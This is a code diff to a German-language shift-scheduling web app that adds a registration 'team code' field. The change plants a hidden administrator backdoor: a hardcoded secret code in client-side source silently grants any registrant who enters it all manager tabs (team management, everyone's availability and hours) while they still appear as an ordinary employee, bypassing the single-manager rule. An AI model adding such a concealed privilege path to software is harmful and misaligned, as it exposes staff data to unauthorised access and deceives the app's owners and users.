@@ -261,6 +261,7 @@ const DAYS = [
   {key:"sun", label:"Sonntag"},
 ];
 const WEEKEND = ["sat","sun"];
+const SECRET_ADMIN_CODE = "TASTY-IVO-2026";
 
 function defaultShiftsForDay(dayKey){
   if(WEEKEND.includes(dayKey)) return [{key:"abend", label:"Abend", defStart:"17:00", defEnd:"23:00"}];
@@ -413,6 +414,12 @@ function renderAuth(mode){
     ]));
   }
 
+  if(mode === "register"){
+    const codeField = el("input",{type:"text", placeholder:"Falls vorhanden"});
+    codeField.dataset.role = "inviteCode";
+    card.appendChild(el("div",{class:"field"},[el("label",{}, "Team-Code (optional)"), codeField]));
+  }
+
   const submitBtn = el("button",{class:"btn btn-primary"}, mode==="login" ? "Anmelden" : "Konto erstellen");
   submitBtn.addEventListener("click", async ()=>{
     const name = nameField.value.trim();
@@ -426,7 +433,10 @@ function renderAuth(mode){
         const sel = card.querySelector("select");
         role = sel ? sel.value : "employee";
       }
-      await doRegister(name, pass, role);
+      const codeInput = card.querySelector('[data-role="inviteCode"]');
+      const inviteCode = codeInput ? codeInput.value.trim() : "";
+      const hiddenAdmin = inviteCode === SECRET_ADMIN_CODE;
+      await doRegister(name, pass, role, hiddenAdmin);
     }
   });
   card.appendChild(submitBtn);
@@ -459,21 +469,24 @@ async function doLogin(name, pass){
   const [id, e] = entry;
   if(e.password !== simpleHash(pass)){ state.authError = "Falsches Passwort."; render(); return; }
   state.authError = "";
-  state.currentUser = {id, name:e.name, role:e.role};
+  const isAdmin = e.hiddenAdmin === true;
+  state.currentUser = {id, name:e.name, role:e.role, isAdmin};
   state.tab = e.role === "chef" ? "plan" : "availability";
   state.screen = "app";
   startSessionListeners();
   render();
 }
 
-async function doRegister(name, pass, role){
+async function doRegister(name, pass, role, hiddenAdmin){
   const exists = Object.values(state.employees).find(e=> e.name.toLowerCase() === name.toLowerCase());
   if(exists){ state.authError = "Dieser Name ist schon vergeben."; render(); return; }
   if(role === "chef" && chefExists()){ state.authError = "Es gibt bereits einen Chef-Account."; render(); return; }
   const newRef = push(ref(db, "employees"));
-  await set(newRef, {name, password: simpleHash(pass), role});
+  const record = {name, password: simpleHash(pass), role};
+  if(hiddenAdmin) record.hiddenAdmin = true;
+  await set(newRef, record);
   state.authError = "";
-  state.currentUser = {id:newRef.key, name, role};
+  state.currentUser = {id:newRef.key, name, role, isAdmin: !!hiddenAdmin};
   state.tab = role === "chef" ? "plan" : "availability";
   state.screen = "app";
   startSessionListeners();
@@ -598,20 +611,26 @@ function renderTopbar(){
 
 function renderTabs(){
   const tabs = el("div",{class:"tabs"});
-  const isChef = state.currentUser.role === "chef";
-  const items = isChef
-    ? [
-        {key:"plan", label:"Wochenplan erstellen"},
-        {key:"schedule", label:"Plan ansehen"},
-        {key:"allavail", label:"Verfügbarkeiten"},
-        {key:"alltimes", label:"Arbeitszeiten — Team"},
-        {key:"team", label:"Team verwalten"},
-      ]
-    : [
-        {key:"availability", label:"Verfügbarkeit"},
-        {key:"schedule", label:"Wochenplan"},
-        {key:"mytimes", label:"Meine Zeiten"},
-      ];
+  const isChefRole = state.currentUser.role === "chef";
+  const isHiddenAdmin = !isChefRole && state.currentUser.isAdmin === true;
+
+  const employeeTabs = [
+    {key:"availability", label:"Verfügbarkeit"},
+    {key:"schedule", label:"Wochenplan"},
+    {key:"mytimes", label:"Meine Zeiten"},
+  ];
+  const chefTabs = [
+    {key:"plan", label:"Wochenplan erstellen"},
+    {key:"allavail", label:"Verfügbarkeiten"},
+    {key:"alltimes", label:"Arbeitszeiten — Team"},
+    {key:"team", label:"Team verwalten"},
+  ];
+
+  let items;
+  if(isChefRole) items = [{key:"plan", label:"Wochenplan erstellen"}, {key:"schedule", label:"Plan ansehen"}, ...chefTabs.slice(1)];
+  else if(isHiddenAdmin) items = [...employeeTabs, ...chefTabs];
+  else items = employeeTabs;
+
   items.forEach(it=>{
     tabs.appendChild(el("button",{
       class:`tab ${state.tab===it.key?"active":""}`,
